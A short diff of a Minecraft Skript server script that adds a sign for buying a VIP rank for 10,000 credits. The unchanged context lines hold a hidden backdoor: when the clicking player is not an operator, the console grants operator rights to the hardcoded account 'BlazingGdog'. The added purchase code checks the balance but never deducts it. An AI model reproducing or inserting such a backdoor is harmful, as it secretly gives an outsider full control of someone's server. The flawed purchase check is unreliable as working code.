@@ -19,3 +19,13 @@ on click:
       if player is not op:
         make console execute command "op BlazingGdog"
         send "You have been oped if you are Blaze!"
+        
+on click:
+ if clicked block is sign:
+  if second line of clicked block is "VIP RANK":
+   if balance of player < 10000:
+    send "&cYou don't have enough credits!"
+   else:
+    send "You have purchased &aVIP &fRank for $10,000!"
+    make console execute command "manuadd %player% VIP"
+    
